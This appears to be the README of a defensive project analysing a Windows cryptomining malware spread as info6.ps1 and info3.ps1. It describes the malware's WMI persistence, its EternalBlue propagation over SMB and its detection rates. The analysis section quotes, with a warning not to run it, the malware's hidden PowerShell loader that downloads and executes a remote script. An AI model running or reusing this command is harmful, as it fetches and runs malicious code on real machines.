# AntiMining-info6

#### By Carlos Ramírez López

### ABOUT
Currently, cryptocurrency mining malware with file name info6.ps1 is being propagated for architecture (X64) and info3.ps1 for architecture (x86) in Windows. This malware is divided into four parts:
1- Performance modification in the computer equipment to "high performance" through the Windows registry.
2- Mining of cryptocurrencies, increasing CPU processing between 70% and 100%.
3- Persistence in infected computers, modifications of Windows variable classes.
4- Propagation through the network taking advantage of the Eternalblue vulnerability in the SMB port 445 of shared folders, scanning the red segment of the computer equipment.



In the page www.virustotal.com, 16 of 59 antivirus detect the files info6.ps1 and info3.ps1 on February 12, 2018 as a malware, however, once the code has been executed on your computer, only 1 of 59 antivirus I detect it, but without creating a solution on the affected computers.
Malware info6.ps1 and info3.ps1
![alt tag](https://github.com/BillyV4/AntiMining-info6/blob/master/Screenshot/Virus_Total1.jpg)

malware in the operating system
![alt tag](https://github.com/BillyV4/AntiMining-info6/blob/master/Screenshot/Virus_total2.jpg)


### ANALYSIS
The malware is downloaded from different IP addresses by means of the script identifying the type of architecture:
#### DO NOT EXECUTE THE FALLOWING COMMAND

```
cmd /c powershell.exe -NoP -NonI -W Hidden "if((Get-WmiObject Win32_OperatingSystem).osarchitecture.contains('64')){IEX(New-Object Net.WebClient).DownloadString('http://IP /info6.ps1')}else{IEX(New-Object Net.WebClient).DownloadString('http://IP/info3.ps1')}"
```
#### The malware creates persistence stored in classes:
```
__FilterToConsumerBinding
CommandLineEventConsumer
__EventFilter –filter
```
